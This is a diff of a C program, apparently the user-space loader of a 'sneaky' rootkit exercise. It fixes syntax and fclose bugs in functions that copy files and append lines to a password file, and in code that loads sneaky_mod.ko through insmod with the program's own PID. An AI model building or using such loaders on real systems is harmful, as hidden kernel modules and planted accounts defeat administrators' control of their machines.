@@ -3,19 +3,19 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-void add_to_pw(const char * fileName, const char * line){
-    FILE * file = fopen(fileName, "a");
+void add_to_pw(const char *fileName, const char *line){
+    FILE *file = fopen(fileName, "a");
     if(!file){
         perror("Fail to open file for writing in pw\n");
         EXIT_FAILURE;
     }
     fprintf(file,"%s",line);
-    fclose(fileName);
+    fclose(file);
 }
 
-void copy_file(const char * origin_file, const char * dest_file){
-    FILE * origin = fopen(origin_file,"r");
-    FILE * dest = fopen(dest_file,"w");
+void copy_file(const char *origin_file, const char *dest_file){
+    FILE *origin = fopen(origin_file,"r");
+    FILE *dest = fopen(dest_file,"w");
     if(!origin){
         perror("Fail to open the origin file\n");
         EXIT_FAILURE;
@@ -40,7 +40,7 @@ int main(){
 
     char command[100];
     sprintf(command, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
-    system(command));
+    system(command);
 
     char input;
     input = getchar();
